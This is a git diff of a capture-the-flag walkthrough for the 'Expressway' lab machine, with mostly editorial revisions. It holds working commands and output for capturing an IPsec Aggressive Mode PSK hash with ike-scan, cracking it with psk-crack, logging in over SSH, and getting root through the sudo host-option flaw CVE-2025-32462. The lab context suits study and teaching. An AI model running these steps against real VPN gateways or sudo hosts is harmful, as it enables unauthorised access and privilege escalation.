@@ -6,12 +6,14 @@ tags: [ipsec]
 
 ---
 
+Expressway is an Easy Linux machine that demonstrated a misconfigured IPsec VPN service (ISAKMP/IKEv1) exposing a Pre-Shared Key (PSK) through Aggressive Mode, which allowed hash-cracking of the VPN group secret. Privilege escalation was achieved due to an unauthorized and vulnerable sudo binary (sudo 1.9.17). This binary allowed host-based sudoers misconfiguration exploitation, ultimately granting full root privileges.
+
 <img width="936" height="134" alt="image" src="https://github.com/user-attachments/assets/5d71d011-121e-47be-8181-1e41e1444a4b" />
 
 ## Recon
 ### Initial Scanning
 
-`nmap` finds one open TCP port, which is SSH (22). I tried to scan several times, but the result is still the same. Since it is not relevant to bruteforce username and password for SSH, we need to check also the UDP ports.
+`nmap` finds one open TCP port, which is SSH (22). I tried to scan several times, but the result is still the same. Since it is not possible to bruteforce username and password for SSH, we need to check also the UDP ports.
 ```bash
 ─ nmap -p- -v --min-rate 1000 10.10.11.87
 Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-20 22:06 +08
@@ -33,7 +35,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-`nmap` finds one open UDP port, which is isakmp (500).
+A UDP scan identified one critical open port, which is isakmp (500).
 
 > ISAKMP on port 500 is the service responsible for negotiating cryptographic keys (IKEv1 or IKEv2) for IPsec VPN tunnels.
 
@@ -84,6 +86,13 @@ Ending ike-scan 1.9.5: 1 hosts scanned in 60.164 seconds (0.02 hosts/sec).  1 re
 1 returned handshake; 0 returned notify
 ```
 
+> `0 returned handshake; 0 returned notify`: This means the target is not an IPsec gateway.
+> 
+> `1 returned handshake; 0 returned notify`: This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you
+> proposed are acceptable (a valid transform will be shown in the output).
+>
+> `0 returned handshake; 1 returned notify`:None of the transforms are acceptable 
+
 So, the server is **definitely an IPsec VPN** and it is configured correctly and responding with valid encryption/auth configuration.
 
 Also, it shows the exact VPN cryptographic parameters:
@@ -125,11 +134,11 @@ IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
 Ending ike-scan 1.9.5: 1 hosts scanned in 0.059 seconds (17.06 hosts/sec).  1 returned handshake; 0 returned notify
 ```
 
-My mistake right here is that I didnt realize taht GroupID is infornt of me, so I tried to bruteforcce it using sveral available scripts.
+My mistake right here is that I didnt realize that GroupID is infornt of me, so I tried to bruteforcce it using sveral available scripts.
 
 The server supports Aggressive Mode, which is insecure because it leaks the Group ID (IDi) before authentication. Even when providing a fake ID, the server responds with its real GroupID `ike@expressway.htb`. So, we do not need to brute-force group names and allow for PSK cracking.
 
-We caoture the hash into hash.txt
+The PSK hash was extracted into `hash.txt`;
 ```bash
 ╰─ ike-scan -M -A -n expressway.htb --pskcrack=hash.txt 10.10.11.87
 Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
@@ -147,7 +156,7 @@ Ending ike-scan 1.9.5: 1 hosts scanned in 0.061 seconds (16.46 hosts/sec).  1 re
 ```
 You can use psk-crack, john (using ikescan2john.py) and hashcat to crack the hash:
 
-We get the password freakingrockstarontheroad.
+We get the password `freakingrockstarontheroad`.
 ```
 ╰─ psk-crack -d /usr/share/wordlists/dirbuster/rockyou.txt hash.txt 
 Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
@@ -156,7 +165,7 @@ key "freakingrockstarontheroad" matches SHA1 hash c9c7b9f8f7dee876bd38e66cb7151c
 Ending psk-crack: 8045039 iterations in 13.693 seconds (587538.85 iterations/sec)
 ```
 ### User flag
-Connnect to SSH as ike.
+The password allowed authentication as user `ike` via SSH. 
 ```bash
 ╰─ ssh ike@10.10.11.87                                 
 ike@10.10.11.87's password: 
@@ -169,14 +178,15 @@ ike@expressway:~$ cat user.txt
 03a700b8c72*******************
 ```
 ## Shell as root
-Itry check sudo but we dont have provelege.
-```
+
+I try to check `sudo` but we don't have the privilege to run it.
+```bash
 ike@expressway:~$ sudo -l
 Password: 
 Sorry, user ike may not run sudo on expressway.
 ```
-Running LinEnum.sh we found 
-```
+Running LinEnum.sh, we found several SUID files;
+```bash
 [-] SUID files:
 -rwsr-xr-x 1 root root 1533496 Aug 14 12:58 /usr/sbin/exim4
 -rwsr-xr-x 1 root root 1047040 Aug 29 15:18 /usr/local/bin/sudo
@@ -194,42 +204,48 @@ Running LinEnum.sh we found
 -r-sr-xr-x 1 root root 13712 Aug 28 09:04 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
 -r-sr-xr-x 1 root root 14416 Aug 28 09:04 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 ```
-<img width="885" height="289" alt="image" src="https://github.com/user-attachments/assets/8140fa8c-de13-4869-9ce4-e9f9fd04aa26" />
-
-It is suspicious to see two sudo binaries. `/usr/local/bin/sudo` is not normal on a Linux system. 
-
-Upon checking we are not using the default /usr/bin/sudo
+Among typical binaries, one unusual entry appeared:
+```bash
+-rwsr-xr-x 1 root root /usr/local/bin/sudo
 ```
+
+This custom sudo binary was suspicious because:
+
+- It resides outside standard directories.
+- The version differed from the system default.
+- It was SUID-root.
+
+Upon checking, we are not using the default `/usr/bin/sudo` as sudo; instead we are using `/usr/local/bin/sudo`.
+```bash
 ike@expressway:~$ which sudo
 /usr/local/bin/sudo
 ```
-The version is also diffrent
-```
-ike@expressway:~$ /usr/bin/sudo -V
-Sudo version 1.9.13p3
-Sudoers policy plugin version 1.9.13p3
-Sudoers file grammar version 50
-Sudoers I/O plugin version 1.9.13p3
-Sudoers audit plugin version 1.9.13p3
-ike@expressway:~$ /usr/local/bin/sudo -V
-Sudo version 1.9.17
-Sudoers policy plugin version 1.9.17
-Sudoers file grammar version 50
-Sudoers I/O plugin version 1.9.17
-Sudoers audit plugin version 1.9.17
+
+The version is also different:
+```bash
+/usr/bin/sudo          → 1.9.13p3
+/usr/local/bin/sudo    → 1.9.17 
 ```
 
-Doing some reseach, sudo 1.9.17 contains CVE-2025-32462 privelege escalation vulnerbailities. Sudo 1.9.17 Host Option - Elevation of Privilege https://www.exploit-db.com/exploits/52354
-I tried to read sudoer file but no permssion
+Doing some research, Sudo 1.9.17 is affected by <a href=" https://www.exploit-db.com/exploits/52354">CVE-2025-32462</a> — Host Option Privilege Escalation.
+
+Looks like we need to read sudoers file to see what are the hosts that we can execute command as. 
+<img width="707" height="288" alt="image" src="https://github.com/user-attachments/assets/e222ec52-22a5-415c-908c-79fd8f653b82" />
+
+I tried to read sudoers file, but got no permission.
 ```
 ike@expressway:~$ cat  /etc/sudoers
 cat: /etc/sudoers: Permission denied
 ```
 
-
+I tried to search for any directories that contain `expressway.htb` string, and we found one at `/var/log/squid/access.log`. 
 ```
 grep -R "expressway.htb" /var/log 2>/dev/null
 /var/log/squid/access.log.1:1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
+```
+By specifying a host with `-h`, sudo resolves host-based sudo rules before password authentication. `ike` can run commands on `offramp.expressway.htb` as root.
+
+```
 ike@expressway:~$ sudo -l -h offramp.expressway.htb
 Matching Defaults entries for ike on offramp:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -238,12 +254,25 @@ User ike may run the following commands on offramp:
     (root) NOPASSWD: ALL
     (root) NOPASSWD: ALL
 ```
-```
+
+First, we check our user privelege using `id`. Then, execute a root shell on `offramp.expressway.htb` by specifying the `-h offramp.expressway.htb`
+option.
+```bash
 ike@expressway:~$ id
 uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
 ike@expressway:~$ sudo -i -h offramp.expressway.htb
 root@expressway:~# ls
 root.txt
+```
+### Root Flag
+We get root shell and read the last flag.
+```bash
 root@expressway:~# cat root.txt
 502864d749c652697cbe55eaf98b8b5b
 ```
+### What is CVE-2025-32462?
+
+`CVE-2025-32462` is a local privilege-escalation flaw in sudo (affecting many versions up through 1.9.17). The bug concerns the `-h/--host` option: that option was intended to be used only for listing (`sudo -l`) on behalf of another host, but the vulnerable version allowed it to use for other sudo operations. 
+
+In environments where sudoers entries restrict commands by host, an attacker who already has some sudo rights (even limited ones) can trick sudo into thinking the request came from a permitted host and thereby execute commands they shouldn’t be allowed to run. Patches were released in 1.9.17p1 and by major distros. 
+
